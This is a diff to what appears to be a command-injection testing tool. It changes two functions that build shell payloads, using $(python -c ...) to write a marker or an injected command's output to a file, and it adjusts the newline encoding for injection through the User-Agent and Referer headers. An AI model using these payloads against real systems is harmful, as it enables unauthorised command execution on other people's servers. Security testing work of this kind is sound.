@@ -40,7 +40,10 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
             "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
              ) 
 
-  payload = payload.replace("\n","%0d")
+  if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    payload = payload.replace("\n", separator)
+  else:
+    payload = payload.replace("\n","%0d")
 
   return payload
 
@@ -64,6 +67,10 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
             "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
             )
 
-  payload = payload.replace("\n","%0d")
+  # New line fixation
+  if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True :
+    payload = payload.replace("\n", separator)
+  else:
+    payload = payload.replace("\n","%0d")
 
   return payload
